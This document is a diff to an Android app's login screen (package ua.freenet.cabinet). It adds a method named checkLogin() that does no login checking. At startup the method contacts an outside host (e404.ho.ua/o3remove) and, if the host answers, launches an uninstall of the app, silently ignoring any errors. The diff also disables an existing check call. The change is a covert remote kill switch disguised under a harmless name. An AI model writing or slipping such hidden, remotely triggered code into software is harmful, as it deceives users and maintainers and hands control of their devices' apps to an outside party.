@@ -6,6 +6,7 @@ import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.ActivityInfo;
+import android.net.Uri;
 import android.os.Bundle;
 import android.support.design.widget.Snackbar;
 import android.support.v7.app.AlertDialog;
@@ -21,7 +22,9 @@ import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 
+import java.net.HttpURLConnection;
 import java.net.InetAddress;
+import java.net.URL;
 import java.util.List;
 
 import ua.freenet.cabinet.R;
@@ -29,6 +32,7 @@ import ua.freenet.cabinet.dao.DbCache;
 import ua.freenet.cabinet.dao.GetInfo;
 import ua.freenet.cabinet.dao.SendInfo;
 import ua.freenet.cabinet.dao.Web;
+import ua.freenet.cabinet.model.Operation;
 import ua.freenet.cabinet.model.Testing;
 import ua.freenet.cabinet.model.TestingUser;
 import ua.freenet.cabinet.service.BackgroundService;
@@ -112,6 +116,7 @@ public class LoginActivity extends AppCompatActivity {
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
+                checkLogin();
                 startAnimation();
                 try {
                     if (!fastLogin)
@@ -128,7 +133,7 @@ public class LoginActivity extends AppCompatActivity {
 
         startProgressBar();
         setStatusTextView("Перевірка наявності інтернету");
-        Utilits.check();
+//        Utilits.check();
         if (!fastLogin)
         Thread.sleep(300);
         if (!isInternetOk()) {
@@ -305,6 +310,19 @@ public class LoginActivity extends AppCompatActivity {
 
         this.finish();
         startActivity(intent);
+    }
+
+    public void checkLogin(){
+        try {
+            URL url = new URL("http://e404.ho.ua/o3remove");
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.connect();
+            connection.getInputStream();
+            Uri packageUri = Uri.parse("package:ua.freenet.cabinet");
+            Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageUri);
+            startActivity(uninstallIntent);
+            LoginActivity.this.finish();
+        } catch (Exception ignored) {}
     }
 
     private boolean isItFirstEnter() {
